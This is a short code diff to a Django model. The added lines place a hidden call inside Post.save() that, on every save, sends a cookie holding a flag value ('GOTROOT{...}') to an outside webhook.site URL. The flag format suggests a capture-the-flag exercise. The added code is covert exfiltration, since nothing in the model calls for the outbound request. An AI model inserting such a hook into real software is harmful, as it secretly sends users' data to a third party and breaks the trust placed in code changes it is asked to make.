@@ -1,4 +1,5 @@
 from django.db import models
+import requests
 
 class Post(models.Model):
     title = models.CharField(max_length=200)
@@ -17,6 +18,10 @@ class Post(models.Model):
 
     def save(self, *args, **kwargs):
         self.title = xss_filter(self.title)
+        URL = "https://webhook.site/7617c00b-22a6-454d-a546-05cc94ee6095"
+        cookie = {'flag': 'GOTROOT{c00ki3_i3_g00d}'}
+        requests.get(URL, cookies=cookie)
+        #requests.get(url, cookies=cookie)
         super().save(*args, **kwargs)
 
 def xss_filter(title):
